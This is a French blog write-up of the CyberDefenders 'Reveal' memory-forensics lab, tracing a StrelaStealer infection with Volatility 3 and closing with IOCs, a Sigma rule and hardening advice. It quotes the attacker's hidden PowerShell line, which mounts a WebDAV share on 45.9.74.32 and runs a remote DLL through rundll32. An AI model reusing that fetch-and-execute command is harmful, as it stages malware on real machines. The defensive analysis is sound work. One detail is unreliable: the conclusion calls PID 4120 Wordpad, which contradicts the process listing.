---
title: "CyberDefenders — Reveal : analyse mémoire d'une attaque StrelaStealer"
date: 2026-03-30T10:00:00+02:00
draft: false
tags: ["ctf", "dfir", "forensic", "blue-team", "malware-analysis", "sigma", "windows", "volatility"]
categories: ["Blue Team"]
summary: "Analyse d'un dump mémoire Windows avec Volatility 3 dans le cadre d'un incident sur un poste financier. Identification d'une chaîne d'exécution PowerShell → WebDAV → rundll32 aboutissant au déploiement de StrelaStealer, un infostealer ciblant les clients mail."
ShowToc: true
TocOpen: true
---

## Contexte et scénario

Un SIEM a levé une alerte sur une activité inhabituelle provenant d'un poste de travail appartenant au département financier d'une institution bancaire. Le SOC a décidé de capturer un dump mémoire de la machine compromise avant toute intervention sur le système live, préservant ainsi la volatilité des artefacts en mémoire. La mission : reconstituer la chaîne d'attaque, identifier les processus malveillants, et qualifier l'incident.

| Champ | Valeur |
|---|---|
| Plateforme | CyberDefenders |
| Lab | Reveal |
| Catégorie | Endpoint Forensics |
| Difficulté | Easy |
| Outil principal | Volatility 3 |
| OS de la victime | Windows 10 (Build 19041, x64) |
| Tactiques MITRE ATT&CK | Defense Evasion (T1218.011), Discovery |
| Famille malware identifiée | StrelaStealer |

{{< figure src="/images/posts/reveal/cyberdefenders-reveal-overview.png" alt="Page d'overview du lab Reveal sur CyberDefenders — 7/7 questions complétées" caption="Lab Reveal — CyberDefenders, Endpoint Forensics, Easy" >}}

---

## Artefacts analysés

L'unique source de données de ce lab est un dump mémoire au format Windows Crash Dump 64-bit : `192-Reveal.dmp`. Volatility 3 l'identifie comme un système Windows 10 (NTBuildLab `19041.1.amd64fre.vb_release.1912`), architecture 64 bits, 2 processeurs logiques. Le timestamp système au moment de la capture est le **2024-07-15 à 07:00:08 UTC**, ce qui servira de repère temporel pour l'ensemble de l'investigation.

---

## Analyse

### Première orientation : cartographier les processus

Avant de chercher quoi que ce soit de suspect, la première étape est de construire une image fidèle de l'état du système au moment du dump. `windows.pslist` donne la liste brute des processus actifs, mais c'est `windows.pstree` qui est vraiment utile pour détecter les anomalies d'arborescence — un processus légitime avec un parent inhabituel est souvent le premier signal d'une compromission.

```
vol -f 192-Reveal.dmp windows.pslist
```

Le résultat dresse un tableau cohérent : `System`, `smss.exe`, `wininit.exe`, `services.exe`, `lsass.exe`, un bouquet de `svchost.exe`, `explorer.exe` (PID 3656), des instances de Microsoft Edge, Thunderbird, Notepad. Rien d'anormal en surface. Ce qui attire l'œil, c'est un cluster de processus démarrés exactement à **07:00:03 UTC**, soit simultanément avec le timestamp système de la capture :

```
9112    4120    wordpad.exe     2024-07-15 07:00:03.000000 UTC
3692    4120    powershell.exe  2024-07-15 07:00:03.000000 UTC
6892    3692    conhost.exe     2024-07-15 07:00:03.000000 UTC
2416    3692    net.exe         2024-07-15 07:00:06.000000 UTC
```

`wordpad.exe` (PID 9112) et `powershell.exe` (PID 3692) sont deux processus frères — ils partagent le même PPID 4120, mais l'un n'est pas l'enfant de l'autre. Ce qui est suspect, c'est leur parent commun : le PID 4120 est introuvable dans la liste des processus actifs. Un PPID sans processus correspondant visible signifie soit un processus déjà terminé au moment du dump (comportement typique d'un dropper éphémère), soit un processus masqué. Dans les deux cas, c'est PID 4120 qui est le vecteur d'infection — il a spawné simultanément un leurre (`wordpad.exe`) et la charge utile (`powershell.exe` en mode caché). `psscan`, qui scanne la mémoire physique plutôt que de traverser les structures EPROCESS, aurait pu révéler ce processus fantôme s'il avait été caché activement.

### Identification du processus malveillant et reconstitution de la commande

Pour confirmer et récupérer la ligne de commande exacte, `windows.pstree` avec filtrage sur le PID 3692 est la commande naturelle. C'est là que tout se révèle :

```
vol -f 192-Reveal.dmp windows.pstree --pid 3692
```

```
PID   PPID  ImageFileName   Offset(V)         Cmd
3692  4120  powershell.exe  0xc90c0358b080    powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
* 2416  3692  net.exe       0xc90c08fd6080    "C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\
* 6892  3692  conhost.exe   0xc90c0a09b0c0    \??\C:\Windows\system32\conhost.exe 0x4
```

{{< figure src="/images/posts/reveal/cyberdefenders-reveal-pstree.png" alt="Output de windows.pstree --pid 3692 montrant la commande PowerShell malveillante complète" caption="windows.pstree — la ligne de commande complète révèle le staging WebDAV et l'exécution de 3435.dll via rundll32" >}}

La commande complète est particulièrement parlante. Elle enchaîne deux actions dans une seule ligne PowerShell lancée en mode caché (`-windowstyle hidden`) :

1. `net use \\45.9.74.32@8888\davwwwroot\` — monter un partage réseau distant via WebDAV sur le port 8888 (notation `@port` spécifique à WebDAV sur Windows)
2. `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` — exécuter directement depuis ce partage distant la DLL `3435.dll` en appelant son point d'entrée `entry`

La DLL n'est jamais écrite sur le disque local. Elle est chargée et exécutée depuis le partage WebDAV, ce qui constitue une technique d'évasion classique : pas de fichier à scanner sur le disque, pas de hash à blacklister localement.

### Confirmation du compte compromis

`windows.getsids` appliqué au PID 3692 confirme l'identité sous laquelle tourne le processus malveillant :

```
vol -f 192-Reveal.dmp windows.getsids --pid 3692
```

```
3692  powershell.exe  S-1-5-21-3274565340-3808842250-3617890653-1001  Elon
3692  powershell.exe  S-1-5-32-544                                     Administrators
3692  powershell.exe  S-1-16-12288                                     High Mandatory Level
```

L'utilisateur **Elon** est membre du groupe `Administrators` et le processus tourne à un niveau d'intégrité **High**. En d'autres termes, l'attaquant dispose déjà de privilèges élevés sur la machine — l'escalade de privilèges n'était pas nécessaire, le compte utilisateur est lui-même administrateur local.

### Vérification réseau : la connexion active

`windows.netscan` filtré sur l'IP de l'attaquant confirme qu'une connexion TCP était effectivement établie au moment du dump :

```
vol -f 192-Reveal.dmp windows.netscan | grep "45.9.74"
```

```
0xc90c09f8db50  TCPv4  192.168.19.150  51038  45.9.74.32  8888  ESTABLISHED  2416  net.exe  2024-07-15 07:00:06.000000 UTC
```

Le processus `net.exe` (PID 2416, enfant de `powershell.exe`) maintient une connexion `ESTABLISHED` vers `45.9.74.32:8888`. C'est le canal WebDAV actif permettant le chargement de la DLL.

### Identification de la famille malware

La combinaison de tous ces éléments — PowerShell caché, WebDAV pour le staging, `rundll32` pour l'exécution d'une DLL chargée depuis un partage réseau, contexte financier — oriente fortement vers **StrelaStealer**. Cette famille d'infostealer, documentée depuis fin 2022, est connue pour cibler spécifiquement les clients mail (Outlook, Thunderbird) afin d'exfiltrer les credentials. Sur ce poste, Thunderbird était d'ailleurs actif (PID 5364 et ses processus enfants). La présence de Thunderbird dans la liste des processus, combinée à la chaîne d'exécution identifiée, confirme la corrélation avec StrelaStealer.

### L'impasse : tenter d'extraire la DLL depuis la mémoire

La dernière question du lab demandait le nom de la famille malware. L'instinct naturel d'un analyste à ce stade est d'essayer de dumper la DLL pour l'analyser statiquement et la faire corréler avec des signatures connues (VirusTotal, MalwareBazaar). J'ai donc tenté `windows.dlllist --pid 3692` pour localiser `3435.dll` dans l'espace mémoire du processus PowerShell.

```
vol -f 192-Reveal.dmp windows.dlllist --pid 3692
```

Le résultat liste une cinquantaine de DLLs chargées par `powershell.exe` — bibliothèques .NET, cryptographiques, réseau — mais `3435.dll` n'y figure pas. La raison est logique : la DLL est exécutée via `rundll32`, pas chargée dans l'espace mémoire de PowerShell. Et `rundll32` lui-même n'apparaît pas dans la liste des processus, ce qui suggère soit qu'il n'avait pas encore été lancé au moment du dump, soit que son exécution a été éphémère.

La solution a finalement été plus directe : l'IP `45.9.74.32` est référencée sur Abuse.ch et plusieurs plateformes de threat intelligence comme infrastructure associée à **StrelaStealer**. La corrélation par IOC réseau était suffisante pour répondre à la question, sans avoir besoin d'analyser le binaire.

---

## IOCs

| Type | Valeur | Contexte |
|---|---|---|
| IP C2 | `45.9.74.32` | Serveur WebDAV hébergeant le payload, référencé sur Abuse.ch comme infrastructure StrelaStealer |

La DLL `3435.dll` n'étant pas disponible en mémoire au moment du dump, aucun hash n'a pu être extrait. C'est la limite inhérente à une analyse mémoire sans accès au binaire sur disque.

### Artefacts forensiques

Éléments utiles à la compréhension de cet incident spécifique, non réutilisables hors contexte de ce dump mémoire.

| Type | Valeur | Contexte |
|---|---|---|
| Processus malveillant | `powershell.exe` PID 3692 | Instance PowerShell exécutant la chaîne d'attaque |
| PPID fantôme | `4120` | Parent absent de pslist — dropper éphémère probable |
| Compte compromis | `Elon` SID `S-1-5-21-3274565340-3808842250-3617890653-1001` | Membre du groupe Administrators |
| IP victime | `192.168.19.150` | Poste compromis |
| Connexion active | `192.168.19.150:51038 → 45.9.74.32:8888 ESTABLISHED` | Canal WebDAV au moment du dump |

---

## Volet défensif

### Détection

L'attaque repose sur une chaîne d'exécution caractéristique qui laisse des traces à plusieurs niveaux.

**PPID fantôme comme signal d'infection.** Le signal le plus fort n'est pas un processus en soi, mais l'absence d'un processus : un PPID (4120) référencé par plusieurs enfants mais absent de `pslist`. Ce pattern — processus parent introuvable — est caractéristique d'un dropper éphémère qui s'exécute, spawne ses charges utiles, puis se termine avant la capture. Sysmon Event ID 1 (Process Creation) permet de corréler PPID et processus enfants ; une règle alertant sur des PPID sans processus parent visible dans une fenêtre temporelle courte est particulièrement efficace pour ce type de loader.

**PowerShell en mode hidden.** L'usage de `-windowstyle hidden` est un indicateur de discrétion volontaire. Couplé à une commande réseau dans la même ligne, c'est un pattern quasi systématique dans les loaders.

**WebDAV comme canal de staging.** La notation `\\IP@PORT\share` est spécifique à WebDAV sur Windows. Elle permet de monter un partage réseau sans passer par SMB, souvent moins surveillé en sortie. Les connexions TCP vers des ports non standard (ici 8888) depuis `net.exe` ou `svchost.exe` sont détectables via Sysmon Event ID 3 (Network Connection).

**rundll32 chargeant depuis un chemin réseau.** L'exécution de `rundll32` avec un chemin UNC comme argument (commençant par `\\`) est intrinsèquement suspecte. Aucune application légitime ne charge une DLL depuis un partage réseau distant en production.

### Règle Sigma

```yaml
title: Suspicious PowerShell WebDAV Staging with Rundll32
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects PowerShell launching a WebDAV mount followed by rundll32 execution
  of a remote DLL — technique associated with StrelaStealer and similar loaders.
references:
  - https://attack.mitre.org/techniques/T1218/011/
author: azynux
date: 2026-03-30
tags:
  - attack.defense_evasion
  - attack.t1218.011
logsource:
  product: windows
  category: process_creation
detection:
  selection_powershell_hidden:
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - '-windowstyle hidden'
      - 'net use'
      - '@'
      - 'davwwwroot'
  selection_rundll32_unc:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains: '\\'
    CommandLine|re: '\\\\[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}@[0-9]+'
  condition: selection_powershell_hidden or selection_rundll32_unc
level: high
falsepositives:
  - None expected in production environments
```

### Recommandations de durcissement

**Bloquer WebDAV vers Internet.** La notation `\\IP@PORT\` repose sur le client WebDAV Windows (WebClient service). Désactiver ce service sur les postes qui n'en ont pas besoin ou bloquer en sortie les connexions HTTP/HTTPS initiées par `net.exe` et `svchost.exe` vers des IP externes sur des ports non standard réduit significativement ce vecteur.

**Restreindre PowerShell.** L'activation du mode `Constrained Language Mode` et la journalisation complète de PowerShell (Script Block Logging, Module Logging, Transcription) via GPO permettent à la fois de limiter les capacités offensives de PowerShell et de conserver des traces exploitables en investigation.

**Appliquer le principe de moindre privilège.** L'utilisateur Elon est membre du groupe Administrators. Un utilisateur financier n'a aucune raison d'avoir des droits d'administration locale. La mise en place de comptes standards pour l'usage quotidien, avec des comptes admin dédiés et séparés, limite l'impact d'une compromission.

**Surveiller rundll32 avec des arguments réseau.** La mise en place d'une règle WDAC (Windows Defender Application Control) ou AppLocker interdisant à `rundll32.exe` de charger des DLLs depuis des chemins UNC empêche cette technique d'exécution spécifique.

**Threat intelligence sur les IOCs réseau.** L'IP `45.9.74.32` est référencée sur plusieurs plateformes (Abuse.ch, Feodo Tracker) comme infrastructure StrelaStealer. L'intégration de feeds de threat intelligence dans le SIEM ou les équipements réseau aurait permis de détecter la connexion avant même l'analyse forensique.

---

## Conclusion

La chaîne d'attaque reconstituée est la suivante : un utilisateur (vraisemblablement via un phishing) a ouvert un fichier dans Wordpad (PID 4120), qui a exécuté PowerShell en mode caché. Ce dernier a monté un partage WebDAV distant et chargé une DLL malveillante (`3435.dll`) directement en mémoire via `rundll32`, sans jamais écrire le payload sur le disque local. La DLL correspond à StrelaStealer, un infostealer connu pour exfiltrer les credentials des clients mail — Thunderbird étant précisément actif sur ce poste au moment de la compromission.

L'ensemble de la chaîne s'est déroulé en quelques secondes (07:00:03 à 07:00:06 UTC), sous un compte utilisateur avec des droits administrateurs, ce qui a éliminé toute nécessité d'escalade de privilèges.

{{< figure src="/images/posts/reveal/cyberdefenders-reveal-questions-1-3.png" alt="Questions Q1 à Q3 résolues — processus malveillant, PPID, nom du payload" caption="Q1–Q3 : identification du processus, du PPID et du second stage" >}}

{{< figure src="/images/posts/reveal/cyberdefenders-reveal-questions-4-7.png" alt="Questions Q4 à Q7 résolues — partage WebDAV, technique MITRE, username, famille malware" caption="Q4–Q7 : partage WebDAV, T1218.011, compte Elon, StrelaStealer" >}}

---

## Ce que j'ai appris

Ce lab illustre bien un réflexe à adopter et une erreur à éviter en DFIR mémoire.

Le réflexe : commencer par `pstree` et s'attarder sur les horodatages. La simultanéité de création de `wordpad.exe` et `powershell.exe` avec le même PPID était le signal le plus clair, bien plus que n'importe quelle recherche de mots-clés. La chronologie révèle la causalité.

L'erreur : j'ai perdu du temps à chercher `3435.dll` dans les DLLs chargées par PowerShell. C'est une confusion de périmètre — la DLL est exécutée par `rundll32`, pas par PowerShell. Volatility liste les modules d'un processus, pas ceux de ses processus enfants séparément. La solution était de pivoter sur l'IP C2 pour corréler avec la threat intelligence, ce qui aurait été le chemin naturel dans un vrai SOC.

Plus généralement, ce lab confirme que dans une investigation mémoire, les informations réseau (netscan) sont souvent le complément indispensable de l'analyse des processus : l'un dit *quoi* tourne, l'autre dit *avec qui ça communique*.

---

## Outils utilisés

| Outil | Usage |
|---|---|
| Volatility 3 (v2.26.2) | Analyse principale du dump mémoire |
| `windows.pslist` / `windows.pstree` | Cartographie des processus et arborescence |
| `windows.psscan` | Détection de processus potentiellement cachés |
| `windows.getsids` | Identification du compte utilisateur associé |
| `windows.dlllist` | Inventaire des modules chargés (piste explorée) |
| `windows.netscan` | Identification des connexions réseau actives |
| Abuse.ch / Threat Intelligence | Corrélation de l'IP C2 avec des campagnes connues |
